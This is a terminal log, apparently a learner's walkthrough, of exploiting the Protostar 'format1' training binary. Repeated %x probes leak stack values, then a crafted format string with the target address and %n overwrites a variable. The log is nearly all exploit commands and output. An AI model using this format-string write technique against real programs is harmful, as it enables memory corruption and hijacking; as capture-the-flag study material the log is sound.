
user@protostar:~$ cd /opt/protostar/bin/
user@protostar:/opt/protostar/bin$ ./format1 AAAAAAA
AAAAAAAuser@protostar:/opt/protostar/bin$ ./format1 "AAAAAAA"
AAAAAAAuser@protostar:/opt/protostar/bin$ ./format1 "%d AAAAAAA"
134518284 AAAAAAAuser@protostar:/opt/protostar/bin$ ./format1 "%d"
134518284user@protostar:/opt/protostar/bin$ ./format1 "%d %d %D "
134518284 -1073743912 %D user@protostar:/opt/protostar/bin$ ./format1 "%d %d %d %d "
134518284 -1073743912 134513769 -1208122620 user@protostar:/opt/protostar/bin$ ./format1 "%d %d %x %x "
134518284 -1073743912 8048469 b7fd8304 user@protostar:/opt/protostar/bin$ ./format1 "%d %d %x %./format1 "%d %d %x %x "
134518284 -1073743912 8048469 b7fd8304 user@protostar:/opt/protostar/bin$ ./format1 "%x %x %x %x"
804960c bffff7d8 8048469 b7fd8304user@protostar:/opt/protostar/bin$ ./format1 "`python -c 'print(%x) * 10`"
bash: command substitution: line 1: unexpected EOF while looking for matching `''
bash: command substitution: line 2: syntax error: unexpected end of file
user@protostar:/opt/protostar/bin$ ./format1 "`python -c 'print(%x) * 10'`"
  File "<string>", line 1
    print(%x) * 10
          ^
SyntaxError: invalid syntax
user@protostar:/opt/protostar/bin$ ./format1 "`python -c 'print %x * 10'`"
  File "<string>", line 1
    print %x * 10
          ^
SyntaxError: invalid syntax
user@protostar:/opt/protostar/bin$ ./format1 "`python -c "print '%x' * 10"`"
804960cbffff7d88048469b7fd8304b7fd7ff4bffff7d88048435bffff99cb7ff1040804845buser@protostar:/opt/protostar/bin$ ./format1 "`python -c "print '%x ' * 10"`"
804960c bffff7c8 8048469 b7fd8304 b7fd7ff4 bffff7c8 8048435 bffff992 b7ff1040 804845b user@protostar:/opt/protostar/bin$ ./format1 "`python -c "print '%x ' * 100"`"
804960c bffff6b8 8048469 b7fd8304 b7fd7ff4 bffff6b8 8048435 bffff884 b7ff1040 804845b b7fd7ff4 8048450 0 bffff738 b7eadc76 2 bffff764 bffff770 b7fe1848 bffff720 ffffffff b7ffeff4 804824d 1 bffff720 b7ff0626 b7fffab0 b7fe1b28 b7fd7ff4 0 0 bffff738 3317e590 19421380 0 0 0 2 8048340 0 b7ff6210 b7eadb9b b7ffeff4 2 8048340 0 8048361 804841c 2 bffff764 8048450 8048440 b7ff1040 bffff75c b7fff8f8 2 bffff87a bffff884 0 bffff9b1 bffff9bf bffff9d3 bffff9f4 bffffa07 bffffa11 bfffff01 bfffff3f bfffff53 bfffff6a bfffff7b bfffff83 bfffff93 bfffffa0 bfffffd4 bfffffe0 0 20 b7fe2414 21 b7fe2000 10 178bfbff 6 1000 11 64 3 8048034 4 20 5 7 7 b7fe3000 8 0 9 8048340 b 3e9 user@protostar:/opt/protostar/bin$ gdb ./format1
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/format1...done.
(gdb) info functions
All defined functions:

File format1/format1.c:
int main(int, char **);
void vuln(char *);

Non-debugging symbols:
0x080482c0  _init
0x08048300  __gmon_start__
0x08048300  __gmon_start__@plt
0x08048310  __libc_start_main
0x08048310  __libc_start_main@plt
0x08048320  printf
0x08048320  printf@plt
0x08048330  puts
0x08048330  puts@plt
0x08048340  _start
0x08048370  __do_global_dtors_aux
0x080483d0  frame_dummy
0x08048440  __libc_csu_fini
0x08048450  __libc_csu_init
0x080484aa  __i686.get_pc_thunk.bx
0x080484b0  __do_global_ctors_aux
0x080484dc  _fini
(gdb) ^Z
[1]+  Stopped                 gdb ./format1
user@protostar:/opt/protostar/bin$ objdump -t ./format1
bash: /usr/bin/objdump: Input/output error
user@protostar:/opt/protostar/bin$ objdump -t format1
bash: /usr/bin/objdump: Input/output error
user@protostar:/opt/protostar/bin$ ./format1 "`python -c "print '%x ' * 100"`"
804960c bffff6b8 8048469 b7fd8304 b7fd7ff4 bffff6b8 8048435 bffff884 b7ff1040 804845b b7fd7ff4 8048450 0 bffff738 b7eadc76 2 bffff764 bffff770 b7fe1848 bffff720 ffffffff b7ffeff4 804824d 1 bffff720 b7ff0626 b7fffab0 b7fe1b28 b7fd7ff4 0 0 bffff738 338675ef 19d383ff 0 0 0 2 8048340 0 b7ff6210 b7eadb9b b7ffeff4 2 8048340 0 8048361 804841c 2 bffff764 8048450 8048440 b7ff1040 bffff75c b7fff8f8 2 bffff87a bffff884 0 bffff9b1 bffff9bf bffff9d3 bffff9f4 bffffa07 bffffa11 bfffff01 bfffff3f bfffff53 bfffff6a bfffff7b bfffff83 bfffff93 bfffffa0 bfffffd4 bfffffe0 0 20 b7fe2414 21 b7fe2000 10 178bfbff 6 1000 11 64 3 8048034 4 20 5 7 7 b7fe3000 8 0 9 8048340 b 3e9 user@protostar:/opt/protostar/bin$ ./format1 "`python -c "print '%x ' * 200"`"
804960c bffff588 8048469 b7fd8304 b7fd7ff4 bffff588 8048435 bffff758 b7ff1040 804845b b7fd7ff4 8048450 0 bffff608 b7eadc76 2 bffff634 bffff640 b7fe1848 bffff5f0 ffffffff b7ffeff4 804824d 1 bffff5f0 b7ff0626 b7fffab0 b7fe1b28 b7fd7ff4 0 0 bffff608 6bfb56a5 41a800b5 0 0 0 2 8048340 0 b7ff6210 b7eadb9b b7ffeff4 2 8048340 0 8048361 804841c 2 bffff634 8048450 8048440 b7ff1040 bffff62c b7fff8f8 2 bffff74e bffff758 0 bffff9b1 bffff9bf bffff9d3 bffff9f4 bffffa07 bffffa11 bfffff01 bfffff3f bfffff53 bfffff6a bfffff7b bfffff83 bfffff93 bfffffa0 bfffffd4 bfffffe0 0 20 b7fe2414 21 b7fe2000 10 178bfbff 6 1000 11 64 3 8048034 4 20 5 7 7 b7fe3000 8 0 9 8048340 b 3e9 c 0 d 3e9 e 3e9 17 1 19 bffff72b 1f bffffff2 f bffff73b 0 0 0 7f000000 3b309763 72ed4a08 b787e414 6977aecb 363836 0 0 0 2f2e0000 6d726f66 317461 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ ./format1 "`python -c "print '%x ' * 200"`"
804960c bffff588 8048469 b7fd8304 b7fd7ff4 bffff588 8048435 bffff758 b7ff1040 804845b b7fd7ff4 8048450 0 bffff608 b7eadc76 2 bffff634 bffff640 b7fe1848 bffff5f0 ffffffff b7ffeff4 804824d 1 bffff5f0 b7ff0626 b7fffab0 b7fe1b28 b7fd7ff4 0 0 bffff608 c3b5cd15 e9e69b05 0 0 0 2 8048340 0 b7ff6210 b7eadb9b b7ffeff4 2 8048340 0 8048361 804841c 2 bffff634 8048450 8048440 b7ff1040 bffff62c b7fff8f8 2 bffff74e bffff758 0 bffff9b1 bffff9bf bffff9d3 bffff9f4 bffffa07 bffffa11 bfffff01 bfffff3f bfffff53 bfffff6a bfffff7b bfffff83 bfffff93 bfffffa0 bfffffd4 bfffffe0 0 20 b7fe2414 21 b7fe2000 10 178bfbff 6 1000 11 64 3 8048034 4 20 5 7 7 b7fe3000 8 0 9 8048340 b 3e9 c 0 d 3e9 e 3e9 17 1 19 bffff72b 1f bffffff2 f bffff73b 0 0 0 1f000000 7600ceb6 e9351e2f af816e5f 697fdac9 363836 0 0 0 2f2e0000 6d726f66 317461 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 



 ./format1 "`python -c "print 'AAAA'+'\x38\x96\x04\x08'+'%x ' * 200"`"       # \x38\x96\x04\x08'  add of target
AAAA8804960c bffff588 8048469 b7fd8304 b7fd7ff4 bffff588 8048435 bffff750 b7ff1040 804845b b7fd7ff4 8048450 0 bffff608 b7eadc76 2 bffff634 bffff640 b7fe1848 bffff5f0 ffffffff b7ffeff4 804824d 1 bffff5f0 b7ff0626 b7fffab0 b7fe1b28 b7fd7ff4 0 0 bffff608 87688cff ad3bdaef 0 0 0 2 8048340 0 b7ff6210 b7eadb9b b7ffeff4 2 8048340 0 8048361 804841c 2 bffff634 8048450 8048440 b7ff1040 bffff62c b7fff8f8 2 bffff746 bffff750 0 bffff9b1 bffff9bf bffff9d3 bffff9f4 bffffa07 bffffa11 bfffff01 bfffff3f bfffff53 bfffff6a bfffff7b bfffff83 bfffff93 bfffffa0 bfffffd4 bfffffe0 0 20 b7fe2414 21 b7fe2000 10 178bfbff 6 1000 11 64 3 8048034 4 20 5 7 7 b7fe3000 8 0 9 8048340 b 3e9 c 0 d 3e9 e 3e9 17 1 19 bffff72b 1f bffffff2 f bffff73b 0 0 0 de000000 d62f6b00 5ec03c41 479a57b6 690d88bf 363836 0 2f2e0000 6d726f66 317461 41414141 8049638 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 


You need to find the currect position where is \x38\x96\x04\x08 in memory stack it is trial and error   and use %n to overright 


./format1 "`python -c "print 'AAAA'+'\x38\x96\x04\x08'+'BBBBB'+'%x ' * 128+' %x'"`"           
AAAA8BBBBB804960c bffff658 8048469 b7fd8304 b7fd7ff4 bffff658 8048435 bffff820 b7ff1040 804845b b7fd7ff4 8048450 0 bffff6d8 b7eadc76 2 bffff704 bffff710 b7fe1848 bffff6c0 ffffffff b7ffeff4 804824d 1 bffff6c0 b7ff0626 b7fffab0 b7fe1b28 b7fd7ff4 0 0 bffff6d8 134d099a 3919bf8a 0 0 0 2 8048340 0 b7ff6210 b7eadb9b b7ffeff4 2 8048340 0 8048361 804841c 2 bffff704 8048450 8048440 b7ff1040 bffff6fc b7fff8f8 2 bffff816 bffff820 0 bffff9b1 bffff9bf bffff9d3 bffff9f4 bffffa07 bffffa11 bfffff01 bfffff3f bfffff53 bfffff6a bfffff7b bfffff83 bfffff93 bfffffa0 bfffffd4 bfffffe0 0 20 b7fe2414 21 b7fe2000 10 178bfbff 6 1000 11 64 3 8048034 4 20 5 7 7 b7fe3000 8 0 9 8048340 b 3e9 c 0 d 3e9 e 3e9 17 1 19 bffff7fb 1f bffffff2 f bffff80b 0 0 0 b6000000 e4fbf8bf a472f650 b64e80e0 69b4625d 363836 0 2f2e0000 6d726f66 317461 41414141  8049638


user@protostar:/opt/protostar/bin$ ./format1 "`python -c "print 'AAAA'+'\x38\x96\x04\x08'+'BBBBB'+'%x ' * 128+' %x'"`"
AAAA8BBBBB804960c bffff658 8048469 b7fd8304 b7fd7ff4 bffff658 8048435 bffff820 b7ff1040 804845b b7fd7ff4 8048450 0 bffff6d8 b7eadc76 2 bffff704 bffff710 b7fe1848 bffff6c0 ffffffff b7ffeff4 804824d 1 bffff6c0 b7ff0626 b7fffab0 b7fe1b28 b7fd7ff4 0 0 bffff6d8 f6fffcd3 dcab4ac3 0 0 0 2 8048340 0 b7ff6210 b7eadb9b b7ffeff4 2 8048340 0 8048361 804841c 2 bffff704 8048450 8048440 b7ff1040 bffff6fc b7fff8f8 2 bffff816 bffff820 0 bffff9b1 bffff9bf bffff9d3 bffff9f4 bffffa07 bffffa11 bfffff01 bfffff3f bfffff53 bfffff6a bfffff7b bfffff83 bfffff93 bfffffa0 bfffffd4 bfffffe0 0 20 b7fe2414 21 b7fe2000 10 178bfbff 6 1000 11 64 3 8048034 4 20 5 7 7 b7fe3000 8 0 9 8048340 b 3e9 c 0 d 3e9 e 3e9 17 1 19 bffff7fb 1f bffffff2 f bffff80b 0 0 0 b4000000 9e029179 9bd60489 a7553749 696bd466 363836 0 2f2e0000 6d726f66 317461 41414141  8049638user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ \x08049638   is address of target variable
bash: x08049638: command not found
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ ./format1 "`python -c "print 'AAAA'+'\x38\x96\x04\x08'+'BBBBB'+'%x ' * 128+'%n '"`"
AAAA8BBBBB804960c bffff658 8048469 b7fd8304 b7fd7ff4 bffff658 8048435 bffff820 b7ff1040 804845b b7fd7ff4 8048450 0 bffff6d8 b7eadc76 2 bffff704 bffff710 b7fe1848 bffff6c0 ffffffff b7ffeff4 804824d 1 bffff6c0 b7ff0626 b7fffab0 b7fe1b28 b7fd7ff4 0 0 bffff6d8 70839f55 5ad72945 0 0 0 2 8048340 0 b7ff6210 b7eadb9b b7ffeff4 2 8048340 0 8048361 804841c 2 bffff704 8048450 8048440 b7ff1040 bffff6fc b7fff8f8 2 bffff816 bffff820 0 bffff9b1 bffff9bf bffff9d3 bffff9f4 bffffa07 bffffa11 bfffff01 bfffff3f bfffff53 bfffff6a bfffff7b bfffff83 bfffff93 bfffffa0 bfffffd4 bfffffe0 0 20 b7fe2414 21 b7fe2000 10 178bfbff 6 1000 11 64 3 8048034 4 20 5 7 7 b7fe3000 8 0 9 8048340 b 3e9 c 0 d 3e9 e 3e9 17 1 19 bffff7fb 1f bffffff2 f bffff80b 0 0 0 29000000 af2618e8 381547b7 1e664280 698bb58f 363836 0 2f2e0000 6d726f66 317461 41414141  you have modified the target :)
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ you have modified the target :)
bash: syntax error near unexpected token `)'
user@protostar:/opt/protostar/bin$ 

